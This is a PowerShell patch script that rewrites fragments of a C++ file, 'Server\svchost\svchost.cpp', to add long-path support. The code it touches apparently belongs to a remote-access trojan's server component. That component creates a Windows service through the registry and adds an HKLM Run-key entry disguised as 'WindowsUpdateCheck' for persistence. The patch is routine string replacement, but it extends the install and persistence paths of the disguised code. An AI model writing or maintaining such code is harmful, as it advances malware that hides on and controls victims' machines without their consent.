$ErrorActionPreference = 'Stop'
$root = 'C:\Users\Administrator\Desktop\' + [char]0x672C + [char]0x673A + [char]0x7814 + [char]0x7A76 + [char]0x539F + [char]0x7406
$p = Join-Path $root 'Server\svchost\svchost.cpp'
$enc = [Text.Encoding]::GetEncoding(936)
$t = $enc.GetString([IO.File]::ReadAllBytes($p))
$crlf = $t.Contains("`r`n")
function Norm($s){ if($crlf){ return ($s -replace "`r?`n","`r`n") } else { return ($s -replace "`r`n","`n") } }

$fwd = @'
#ifndef XTP_MAX_LONGPATH
#define XTP_MAX_LONGPATH 32768
#endif
static void MakeLongPath(char* out, int outCc, const char* in);

'@

$o1 = 'static BOOL CreateServiceViaRegistry(const char* serviceName,'
$n1 = $fwd + $o1

$o2 = 'wchar_t wExePath[MAX_PATH * 2]  = {0};'
$n2 = 'wchar_t wExePath[XTP_MAX_LONGPATH] = {0};'

$o3 = @'
AnsiToWide(exePath,     wExePath, MAX_PATH * 2);
'@
$n3 = @'
char longExe[XTP_MAX_LONGPATH + 16] = {0};
	const char* effExe = exePath;
	if (lstrlenA(exePath) >= MAX_PATH) { MakeLongPath(longExe, sizeof(longExe), exePath); effExe = longExe; }
	AnsiToWide(effExe, wExePath, XTP_MAX_LONGPATH);
'@

$o4 = 'WriteRegEx(HKEY_LOCAL_MACHINE,run,"WindowsUpdateCheck", REG_SZ,SystemPath,strlen(SystemPath), 0);'
$n4 = @'
{
		char longRun[XTP_MAX_LONGPATH + 16] = {0};
		const char* effRun = SystemPath;
		if (lstrlenA(SystemPath) >= MAX_PATH) { MakeLongPath(longRun, sizeof(longRun), SystemPath); effRun = longRun; }
		WriteRegEx(HKEY_LOCAL_MACHINE,run,"WindowsUpdateCheck", REG_SZ,(char*)effRun,lstrlenA(effRun), 0);
	}
'@

$o5 = @'
char CommandLine[1024] = {0};
		wsprintfA(CommandLine, "\"%s\" Win7", FilePath);
'@
$n5 = @'
char CommandLine[XTP_MAX_LONGPATH + 32] = {0};
		char longCmd[XTP_MAX_LONGPATH + 16] = {0};
		const char* effCmd = FilePath;
		if (lstrlenA(FilePath) >= MAX_PATH) { MakeLongPath(longCmd, sizeof(longCmd), FilePath); effCmd = longCmd; }
		wsprintfA(CommandLine, "\"%s\" Win7", effCmd);
'@

$pairs = @(
 @($o1,$n1,1), @($o2,$n2,1), @($o3,$n3,1), @($o4,$n4,1), @($o5,$n5,1)
)

$log = @(); $ok = $true
foreach($pr in $pairs){
 $oo = Norm $pr[0]; $nn = Norm $pr[1]
 $cnt = ([regex]::Matches($t,[regex]::Escape($oo))).Count
 $mark = $oo.Substring(0,[Math]::Min(36,$oo.Length)) -replace "`r?`n",' '
 if($cnt -eq $pr[2]){ $t = $t.Replace($oo,$nn); $log += ("[OK x$cnt] " + $mark) }
 else { $ok = $false; $log += ("[want $($pr[2]) got $cnt] " + $mark) }
}
if($ok){ [IO.File]::WriteAllBytes($p,$enc.GetBytes($t)); $log += 'WRITTEN' } else { $log += 'NOT WRITTEN' }
[IO.File]::WriteAllLines((Join-Path $root 'tools\_fix.txt'),$log,(New-Object Text.UTF8Encoding($true)))
